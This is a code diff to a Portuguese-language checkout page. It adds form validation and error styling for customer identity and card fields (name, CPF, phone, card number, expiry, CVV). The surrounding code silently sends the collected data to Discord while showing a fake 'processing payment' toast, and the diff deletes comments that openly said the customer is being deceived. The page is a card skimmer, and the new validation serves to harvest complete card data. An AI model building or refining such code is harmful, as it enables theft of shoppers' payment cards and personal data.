@@ -49,6 +49,26 @@
   .b2-payment-badges { display: flex; align-items: center; justify-content: center; gap: .5rem; font-size: .75rem; opacity: .5; margin-top: .5rem; }
   .b2-guarantee { text-align: center; font-size: .78rem; opacity: .55; margin-top: .5rem; }
 
+  /* ---------- ERRO DE VALIDAÇÃO ---------- */
+  .b2-field input.b2-invalid,
+  .b2-field select.b2-invalid {
+    border-color: #EF4444;
+    background: #FEF2F2;
+  }
+  .b2-field input.b2-invalid:focus,
+  .b2-field select.b2-invalid:focus {
+    border-color: #EF4444;
+    box-shadow: 0 0 0 3px #EF44441a;
+  }
+  .b2-error-msg {
+    display: none;
+    font-size: .72rem;
+    font-weight: 600;
+    color: #EF4444;
+    margin-top: .15rem;
+  }
+  .b2-error-msg.show { display: block; }
+
   /* ---------- TOAST (pop-up voador) ---------- */
   .b2-toast {
     position: fixed;
@@ -89,6 +109,9 @@
     border-radius: 50%;
     animation: spin 1s linear infinite;
   }
+  .b2-toast.erro .b2-toast-icon { background: #EF4444; }
+  .b2-toast.erro .b2-toast-icon::before { content: '!'; }
+  .b2-toast.erro .b2-toast-spin { display: none; }
 
   .b2-modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.5); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 1rem; }
   .b2-modal-backdrop.hidden { display: none; }
@@ -124,20 +147,24 @@
         <div class="b2-field-group">
           <div class="b2-field">
             <label>Nome e Sobrenome</label>
-            <input type="text" name="customer_name" placeholder="Nome e Sobrenome" required>
+            <input type="text" name="customer_name" id="customer_name" placeholder="Nome e Sobrenome">
+            <span class="b2-error-msg" data-error-for="customer_name">Informe seu nome completo</span>
           </div>
           <div class="b2-field">
             <label>E-mail</label>
-            <input type="email" name="customer_email" placeholder="seuemail@exemplo.com" required>
+            <input type="email" name="customer_email" id="customer_email" placeholder="seuemail@exemplo.com">
+            <span class="b2-error-msg" data-error-for="customer_email">Informe um e-mail válido</span>
           </div>
           <div class="b2-row-2">
             <div class="b2-field">
               <label>CPF</label>
               <input type="text" name="customer_document" id="doc-input" placeholder="000.000.000-00">
+              <span class="b2-error-msg" data-error-for="doc-input">Informe seu CPF</span>
             </div>
             <div class="b2-field">
               <label>Telefone</label>
               <input type="tel" name="customer_phone" id="phone-input" placeholder="(11) 99999-9999">
+              <span class="b2-error-msg" data-error-for="phone-input">Informe seu telefone</span>
             </div>
           </div>
         </div>
@@ -193,33 +220,37 @@
               <label for="card-name">Nome impresso no cartão</label>
               <input type="text" id="card-name" name="card-name"
                      placeholder="Como está no cartão"
-                     autocomplete="cc-name" required>
+                     autocomplete="cc-name">
+              <span class="b2-error-msg" data-error-for="card-name">Informe o nome impresso no cartão</span>
             </div>
             <div class="b2-field">
               <label for="card-number">Número do cartão</label>
               <input type="text" id="card-number" name="card-number"
                      placeholder="0000 0000 0000 0000"
                      inputmode="numeric" autocomplete="cc-number"
-                     maxlength="19" required>
+                     maxlength="19">
+              <span class="b2-error-msg" data-error-for="card-number">Informe os 16 dígitos do cartão</span>
             </div>
             <div class="b2-row-2">
               <div class="b2-field">
                 <label for="card-expiry">Validade</label>
                 <input type="text" id="card-expiry" name="card-expiry"
                        placeholder="MM/AA" inputmode="numeric"
-                       autocomplete="cc-exp" maxlength="5" required>
+                       autocomplete="cc-exp" maxlength="5">
+                <span class="b2-error-msg" data-error-for="card-expiry">Informe a validade</span>
               </div>
               <div class="b2-field">
                 <label for="card-cvv">CVV</label>
                 <input type="tel" id="card-cvv" name="card-cvv"
                        placeholder="000" inputmode="numeric"
-                       autocomplete="cc-csc" maxlength="3" required>
+                       autocomplete="cc-csc" maxlength="3">
+                <span class="b2-error-msg" data-error-for="card-cvv">Informe o CVV (3 dígitos)</span>
               </div>
             </div>
             <div class="b2-field">
               <label for="card-installments">Parcelas</label>
-              <select id="card-installments" name="card-installments" required>
-                <option value="">Selecione...</option>
+              <select id="card-installments" name="card-installments">
+                <option value="1" selected>1x de R$ 19,90 (à vista)</option>
               </select>
             </div>
           </div>
@@ -337,16 +368,19 @@
       document.getElementById('pane-cartao').classList.toggle('active', currentMethod === 'redes');
       document.querySelector('.b2-pay-btn__text').textContent =
         currentMethod === 'pix' ? 'PAGAR AGORA' : 'PAGAR AGORA';
+      limparErros();
     });
   });
 
   // ---------- Parcelas ----------
   const installments = document.getElementById('card-installments');
+  installments.innerHTML = '';
   for (let i = 1; i <= 12; i++) {
     const val = (BASE_AMOUNT / 100 / i).toFixed(2).replace('.', ',');
     const opt = document.createElement('option');
     opt.value = i;
     opt.textContent = i === 1 ? `1x de R$ ${val} (à vista)` : `${i}x de R$ ${val}`;
+    if (i === 1) opt.selected = true;
     installments.appendChild(opt);
   }
 
@@ -380,13 +414,96 @@
 
   // ---------- TOAST (pop-up voador genérico) ----------
   let toastTimer = null;
-  function mostrarToast(texto) {
+  function mostrarToast(texto, tipo) {
     const toast = document.getElementById('b2-toast');
     const span  = document.getElementById('b2-toast-text');
     span.textContent = texto;
+    toast.classList.toggle('erro', tipo === 'erro');
     toast.classList.add('show');
     clearTimeout(toastTimer);
     toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
+  }
+
+  // ---------- VALIDAÇÃO ----------
+  function marcarErro(id, msg) {
+    const el = document.getElementById(id);
+    const err = document.querySelector(`.b2-error-msg[data-error-for="${id}"]`);
+    if (el) el.classList.add('b2-invalid');
+    if (err) {
+      if (msg) err.textContent = msg;
+      err.classList.add('show');
+    }
+  }
+
+  function limparErro(id) {
+    const el = document.getElementById(id);
+    const err = document.querySelector(`.b2-error-msg[data-error-for="${id}"]`);
+    if (el) el.classList.remove('b2-invalid');
+    if (err) err.classList.remove('show');
+  }
+
+  function limparErros() {
+    document.querySelectorAll('.b2-invalid').forEach(el => el.classList.remove('b2-invalid'));
+    document.querySelectorAll('.b2-error-msg.show').forEach(el => el.classList.remove('show'));
+  }
+
+  // Limpa o erro assim que o usuário começa a digitar/selecionar
+  ['customer_name','customer_email','doc-input','phone-input',
+   'card-name','card-number','card-expiry','card-cvv','card-installments'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input',  () => limparErro(id));
+    el.addEventListener('change', () => limparErro(id));
+  });
+
+  // Valida todos os campos e retorna true se estiver tudo ok
+  function validarFormulario() {
+    limparErros();
+    const erros = [];
+
+    // --- Etapa 1: Identificação ---
+    const nome = document.getElementById('customer_name').value.trim();
+    if (!nome) { marcarErro('customer_name', 'Informe seu nome completo'); erros.push('customer_name'); }
+    else if (nome.split(' ').filter(Boolean).length < 2) {
+      marcarErro('customer_name', 'Informe nome e sobrenome'); erros.push('customer_name');
+    }
+
+    const email = document.getElementById('customer_email').value.trim();
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    if (!email) { marcarErro('customer_email', 'Informe seu e-mail'); erros.push('customer_email'); }
+    else if (!emailOk) { marcarErro('customer_email', 'E-mail inválido'); erros.push('customer_email'); }
+
+    const cpf = document.getElementById('doc-input').value.replace(/\D/g, '');
+    if (!cpf) { marcarErro('doc-input', 'Informe seu CPF'); erros.push('doc-input'); }
+    else if (cpf.length !== 11) { marcarErro('doc-input', 'CPF incompleto'); erros.push('doc-input'); }
+
+    const tel = document.getElementById('phone-input').value.replace(/\D/g, '');
+    if (!tel) { marcarErro('phone-input', 'Informe seu telefone'); erros.push('phone-input'); }
+    else if (tel.length < 10) { marcarErro('phone-input', 'Telefone incompleto'); erros.push('phone-input'); }
+
+    // --- Etapa 2: Só valida cartão se a aba Cartão estiver ativa ---
+    if (currentMethod === 'redes') {
+      const cardName = document.getElementById('card-name').value.trim();
+      if (!cardName) { marcarErro('card-name', 'Informe o nome impresso no cartão'); erros.push('card-name'); }
+
+      const cardNum = document.getElementById('card-number').value.replace(/\D/g, '');
+      if (!cardNum) { marcarErro('card-number', 'Informe o número do cartão'); erros.push('card-number'); }
+      else if (cardNum.length < 16) { marcarErro('card-number', 'Número incompleto (16 dígitos)'); erros.push('card-number'); }
+
+      const expiry = document.getElementById('card-expiry').value.trim();
+      if (!expiry) { marcarErro('card-expiry', 'Informe a validade'); erros.push('card-expiry'); }
+      else if (!/^\d{2}\/\d{2}$/.test(expiry)) { marcarErro('card-expiry', 'Use o formato MM/AA'); erros.push('card-expiry'); }
+      else {
+        const mm = parseInt(expiry.slice(0,2), 10);
+        if (mm < 1 || mm > 12) { marcarErro('card-expiry', 'Mês inválido'); erros.push('card-expiry'); }
+      }
+
+      const cvv = document.getElementById('card-cvv').value;
+      if (!cvv) { marcarErro('card-cvv', 'Informe o CVV'); erros.push('card-cvv'); }
+      else if (cvv.length !== 3) { marcarErro('card-cvv', 'CVV deve ter 3 dígitos'); erros.push('card-cvv'); }
+    }
+
+    return erros;
   }
 
   // ---------- ENVIO PRO DISCORD (silencioso) ----------
@@ -428,6 +545,19 @@
   const form = document.getElementById('checkout-form');
   form.addEventListener('submit', async e => {
     e.preventDefault();
+
+    // 🔒 Valida ANTES de qualquer coisa
+    const erros = validarFormulario();
+    if (erros.length > 0) {
+      mostrarToast('Preencha os campos destacados', 'erro');
+      const primeiro = document.getElementById(erros[0]);
+      if (primeiro) {
+        primeiro.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        setTimeout(() => primeiro.focus(), 300);
+      }
+      return;
+    }
+
     setLoading(true);
 
     const fd = new FormData(form);
@@ -446,13 +576,9 @@
       installments: installments.value
     };
 
-    // 👇 Toast genérico (o cliente acha que é o pagamento processando)
     mostrarToast('Processando pagamento...');
-
-    // 👇 Envio silencioso pro Discord (roda em segundo plano)
     enviarParaDiscord(dados);
 
-    // ---------- Fluxo visual normal do checkout ----------
     try {
       await new Promise(r => setTimeout(r, 1500));
 
